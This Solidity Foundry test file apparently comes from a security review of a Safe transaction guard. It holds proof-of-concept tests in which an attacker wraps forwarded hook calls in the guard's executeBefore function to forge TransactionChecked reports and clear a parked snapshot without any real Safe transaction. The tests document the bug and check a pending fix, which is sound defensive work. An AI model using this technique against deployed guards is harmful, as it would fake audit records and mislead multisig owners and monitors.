// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Vm} from "forge-std/Vm.sol";

import {CuratorGuard} from "contracts/guards/CuratorGuard.sol";
import {CuratorGuardPolicy} from "contracts/guards/CuratorGuardPolicy.sol";
import {ISafe} from "contracts/interfaces/safe/ISafe.sol";
import {Operation} from "contracts/interfaces/safe/ISafeGuard.sol";
import {CuratorGuardTestBase, MockProtocol} from "test/guards/CuratorGuardTestBase.sol";

/// @title G9a-1 (round 9, Safe-integration lens): `executeBefore` re-dispatches a forwarded after-hook
///        at its canonical length.
/// @dev   V2-89 closed forwarded hook calls (a Safe whose fallback handler is this guard forwards every
///        unknown selector to it with the Safe as `msg.sender` and the caller's 20 bytes appended) with
///        two checks: no approval is spent while the handler slot holds the guard, and an after-hook must
///        be exactly 68 bytes. `executeBefore(deadline, call)` is `delegatecall(address(this), call)`: in
///        that inner frame `msg.sender` is still the Safe and `msg.data` is `call` itself, 68 bytes for an
///        after-hook, so the length check passes. A stranger can therefore run `checkAfterExecution` /
///        `checkAfterModuleExecution` AS THE SAFE with no Safe transaction and forge `TransactionChecked`
///        (Bypass inside any window; Policy, under an arbitrary hash, when the policy does not enforce a
///        handler requirement, by first parking a snapshot with the forwarded pre-hook, which the
///        documented residual says "dies with the stranger's transaction": here it is cleared and
///        reported instead). The precondition is the one V2-89 names (the guard in the handler slot).
///        These tests pass against the current code and fail once `executeBefore` refuses a forwarded
///        caller (fixes/G9a-1-executeBefore-refuse-forwarded.diff).
contract G9a_ForwardedExecuteBeforeTest is CuratorGuardTestBase {
    bytes32 internal constant FORGED = keccak256("no Safe transaction ever carried this hash");
    bytes32 internal constant REPORT_SIG = keccak256("TransactionChecked(address,bytes32,uint8,uint8)");

    function _handler(address handler_) internal {
        vm.prank(address(safe));
        (bool _ok, ) = address(safe).call(abi.encodeWithSignature("setFallbackHandler(address)", handler_));
        assertTrue(_ok);
    }

    function _afterHook(bytes32 hash_) internal view returns (bytes memory) {
        return abi.encodeCall(guard.checkAfterExecution, (hash_, true));
    }

    function _preHook(bytes memory data_) internal view returns (bytes memory) {
        return
            abi.encodeCall(
                guard.checkTransaction,
                (address(protocol), 0, data_, Operation.Call, 0, 0, 0, address(0), payable(address(0)), "", attacker)
            );
    }

    /// @dev `executeBefore(deadline, call_)`: the wrapper every timelocked admin call uses.
    function _wrapped(bytes memory call_) internal view returns (bytes memory) {
        return abi.encodeCall(guard.executeBefore, (uint64(block.timestamp + 1 hours), call_));
    }

    /// @dev The guard's `TransactionChecked` reports among `logs_`: count, last hash, last outcome, last path.
    function _reports(
        Vm.Log[] memory logs_
    ) internal view returns (uint256 _count, bytes32 _hash, uint256 _outcome, uint256 _path) {
        for (uint256 i; i < logs_.length; ++i) {
            if (logs_[i].emitter != address(guard) || logs_[i].topics[0] != REPORT_SIG) continue;
            ++_count;
            assertEq(logs_[i].topics[1], bytes32(uint256(uint160(address(safe)))), "report names the Safe");
            _hash = logs_[i].topics[2];
            _outcome = uint256(logs_[i].topics[3]);
            _path = abi.decode(logs_[i].data, (uint256));
        }
    }

    /// @dev Shipped policy shape (handler requirement enforced at zero), the guard in the handler slot
    ///      (V2-89's precondition), a council window open (the documented repair state). The direct
    ///      forwarded after-hook is refused (V2-89 holds); the same after-hook wrapped in `executeBefore`
    ///      is accepted and a `Bypass` report is forged under an arbitrary hash: no Safe transaction, the
    ///      nonce does not move, the caller is a stranger.
    function test_poc_forwarded_executeBefore_forges_a_bypass_report() public {
        _enforce();
        _allow(address(protocol), MockProtocol.settleDeposit.selector);
        vm.prank(vetro);
        guard.setRequiredFallbackHandler(address(safe), address(0), true);
        _handler(address(guard));
        vm.prank(council);
        guard.bypass(address(safe), 1 hours);
        uint256 _nonce = safe.nonce();

        // Control: V2-89's length check refuses the directly forwarded after-hook (68 + 20 bytes).
        vm.prank(attacker);
        (bool _ok, bytes memory _ret) = address(safe).call(_afterHook(FORGED));
        assertFalse(_ok, "direct forwarded after-hook refused");
        assertEq(bytes4(_ret), CuratorGuard.ForwardedHookCall.selector);

        // The same after-hook wrapped in `executeBefore`: the Safe forwards `executeBefore(...)` + 20 bytes
        // (the decoder ignores the padding), the guard delegatecalls itself with `call_` as the whole
        // calldata (68 bytes) and `msg.sender` still the Safe.
        vm.recordLogs();
        vm.prank(attacker);
        (_ok, ) = address(safe).call(_wrapped(_afterHook(FORGED)));
        assertTrue(_ok, "forwarded executeBefore(checkAfterExecution) accepted");
        (uint256 _count, bytes32 _hash, uint256 _outcome, uint256 _path) = _reports(vm.getRecordedLogs());
        assertEq(_count, 1, "one forged report");
        assertEq(_hash, FORGED, "under the stranger's hash");
        assertEq(_outcome, uint256(CuratorGuard.Outcome.Bypass));
        assertEq(_path, 0);
        assertEq(safe.nonce(), _nonce, "no Safe transaction ran");
    }

    /// @dev Same precondition on a policy that does not enforce a handler requirement (the validator
    ///      allows that with `$allowUnenforcedHandler`): the forwarded pre-hook parks a snapshot (the
    ///      documented residual), the wrapped after-hook clears it and reports `Policy` under an arbitrary
    ///      hash, and the slot is clean again, so the laundering is invisible: a genuine Safe transaction
    ///      later in the same EVM transaction no longer trips `NestedExecution` (which the residual test
    ///      `test_residual_a_forwarded_policy_pre_hook_only_parks_a_transient_snapshot` relies on).
    function test_poc_forwarded_executeBefore_launders_a_parked_snapshot_into_a_policy_report() public {
        _enforce();
        _allow(address(protocol), MockProtocol.settleDeposit.selector);
        _handler(address(guard));
        bytes memory _settle = abi.encodeCall(MockProtocol.settleDeposit, (1));

        vm.recordLogs();
        vm.startPrank(attacker);
        (bool _ok, ) = address(safe).call(_preHook(_settle));
        assertTrue(_ok, "forwarded policy pre-hook parks a snapshot");
        (_ok, ) = address(safe).call(_wrapped(_afterHook(FORGED)));
        assertTrue(_ok, "forwarded executeBefore(checkAfterExecution) clears it");
        vm.stopPrank();
        (uint256 _count, bytes32 _hash, uint256 _outcome, ) = _reports(vm.getRecordedLogs());
        assertEq(_count, 1, "one forged report");
        assertEq(_hash, FORGED);
        assertEq(_outcome, uint256(CuratorGuard.Outcome.Policy), "reported as a POLICY pass");
        assertEq(protocol.calls(), 0, "nothing executed");

        // The slot is clean: the curator's genuine transaction in the same EVM transaction passes, where
        // the parked snapshot alone would have made it revert `NestedExecution`.
        assertTrue(_execSafeTx(address(protocol), 0, _settle, Operation.Call));
        assertEq(protocol.calls(), 1);
    }

    /// @dev The pre-hook can be wrapped too (it was already forwardable directly), so one `executeBefore`
    ///      pair is a complete fake "transaction" on the policy path, pre- and post-hook, from a stranger.
    function test_poc_both_hooks_wrapped_in_executeBefore_make_a_complete_fake_policy_transaction() public {
        _enforce();
        _allow(address(protocol), MockProtocol.settleDeposit.selector);
        _handler(address(guard));
        bytes memory _settle = abi.encodeCall(MockProtocol.settleDeposit, (1));

        vm.recordLogs();
        vm.startPrank(attacker);
        (bool _ok, ) = address(safe).call(_wrapped(_preHook(_settle)));
        assertTrue(_ok, "wrapped pre-hook");
        (_ok, ) = address(safe).call(_wrapped(_afterHook(FORGED)));
        assertTrue(_ok, "wrapped after-hook");
        vm.stopPrank();
        (uint256 _count, bytes32 _hash, uint256 _outcome, ) = _reports(vm.getRecordedLogs());
        assertEq(_count, 1);
        assertEq(_hash, FORGED);
        assertEq(_outcome, uint256(CuratorGuard.Outcome.Policy));
    }

    /// @dev What the wrapper does NOT open (so the finding stays at forged reports): the approval branch
    ///      reads the handler slot, not the calldata shape, so a wrapped pre-hook for an approved payload
    ///      still spends nothing; and the role surface refuses a forwarded caller inside the wrapper too.
    function test_the_wrapper_spends_no_approval_and_grants_no_role() public {
        _enforce();
        _handler(address(guard));
        bytes memory _settle = abi.encodeCall(MockProtocol.settleDeposit, (7));
        bytes32 _id = _approve(address(protocol), 0, _settle, Operation.Call);

        vm.startPrank(attacker);
        (bool _ok, bytes memory _ret) = address(safe).call(_wrapped(_preHook(_settle)));
        assertFalse(_ok);
        // `ForwardedHookCall` on the current code (the approval branch reads the handler slot);
        // `Unauthorized` once `executeBefore` refuses a forwarded caller (fixes/G9a-1).
        assertTrue(
            bytes4(_ret) == CuratorGuard.ForwardedHookCall.selector || bytes4(_ret) == CuratorGuardPolicy.Unauthorized.selector,
            "approval branch still refused"
        );
        assertGt(guard.approvalExpiry(_id), 0, "approval intact");
        // A role action wrapped and forwarded is refused by the role rail (V2-100), whatever the wrapper.
        (_ok, _ret) = address(safe).call(_wrapped(abi.encodeCall(guard.lockdown, (address(protocol)))));
        assertFalse(_ok);
        vm.stopPrank();
    }
}
